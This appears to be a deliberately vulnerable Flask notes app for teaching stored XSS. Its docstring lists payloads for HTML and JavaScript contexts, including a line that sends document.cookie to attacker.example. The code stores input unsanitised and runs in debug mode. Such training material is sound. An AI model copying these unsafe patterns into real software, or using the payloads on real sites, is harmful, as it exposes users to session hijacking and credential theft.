"""
Contextual Output Encoding — Vulnerable (XSS)

A mission notes board where team members can post and read notes.
User-supplied content is rendered unsafely in two contexts:

  1. HTML context — Jinja2 auto-escaping is disabled via the '| safe' filter,
     so any HTML or script tags in the note are rendered as live markup.

  2. JavaScript context — the note value is interpolated directly into a
     <script> block using string concatenation, so closing the string and
     injecting JavaScript is trivial.

Either vector allows stored Cross-Site Scripting (XSS): the attacker's script
runs in the browser of every user who views the notes page, in the origin of
the application — enabling session hijacking, credential theft, or DOM
manipulation.

Run:
    pip install flask
    python app.py

XSS exploit examples:

    # HTML context — inject a script tag
    Note text: <script>alert('XSS via HTML context')</script>

    # JS context — break out of the string and inject code
    Note text: '; alert('XSS via JS context'); var x='

    # Session hijack simulation (realistic impact)
    Note text: <script>fetch('https://attacker.example/steal?c='+document.cookie)</script>

Visit http://127.0.0.1:5000 and submit the note — the script executes.
"""

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)

# In-memory store — shared across all requests (no database for demo simplicity)
notes: list[str] = []


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", notes=notes)


@app.route("/note", methods=["POST"])
def add_note():
    # VULNERABILITY: No sanitisation of user-supplied content before storage.
    # The raw value — including any HTML or script tags — is stored and later
    # rendered directly into the page.
    note = request.form.get("note", "")
    notes.append(note)  # VULNERABLE: stored unsanitised
    return redirect(url_for("index"))


if __name__ == "__main__":
    # VULNERABILITY: debug=True exposes interactive tracebacks
    app.run(debug=True)
